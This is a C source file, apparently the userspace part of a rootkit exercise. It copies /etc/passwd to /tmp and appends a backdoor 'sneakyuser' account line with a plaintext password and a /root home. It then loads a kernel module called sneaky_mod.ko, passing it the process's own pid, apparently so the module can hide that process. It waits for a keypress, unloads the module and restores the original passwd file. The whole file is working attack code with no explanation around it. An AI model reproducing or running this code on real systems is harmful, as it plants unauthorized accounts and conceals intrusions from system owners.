#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
int copypw();
int run_sub_process();
int copypwback();
void readfromkb();
int main() {
  pid_t pid = getpid();
  printf("sneaky_process pid = %d\n", pid);
  if (copypw() == -1) {
    printf("failed to copy file\n");
    return EXIT_FAILURE;
  }
  char cmd[30];
  sprintf(cmd, "/sbin/insmod sneaky_mod.ko pid=%d", pid);

  system(cmd);
  readfromkb();
  system("/sbin/rmmod sneaky_mod");
  if (copypwback() == -1) {
    printf("failed to copy passwd back\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}
int copypw() {
  char *newline = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  FILE *src = fopen("/etc/passwd", "r+");
  if (src == NULL)
    return -1;
  FILE *dst = fopen("/tmp/passwd", "w");
  if (dst == NULL)
    return -1;
  char c = fgetc(src);
  while (c != EOF) {
    fputc(c, dst);
    c = fgetc(src);
  }
  fprintf(src, "%s", newline);
  fclose(src);
  fclose(dst);
  return 0;
}
int copypwback() {

  FILE *src = fopen("/tmp/passwd", "r");
  FILE *dst = fopen("/etc/passwd", "w");
  if (src == NULL)
    return -1;
  if (dst == NULL)
    return -1;
  char c = fgetc(src);
  while (c != EOF) {
    fputc(c, dst);
    c = fgetc(src);
  }
  fclose(src);
  fclose(dst);
  return 0;
}

void readfromkb() {
  char c = fgetc(stdin);
  while (c != 'q') {
    c = fgetc(stdin);
  }
}
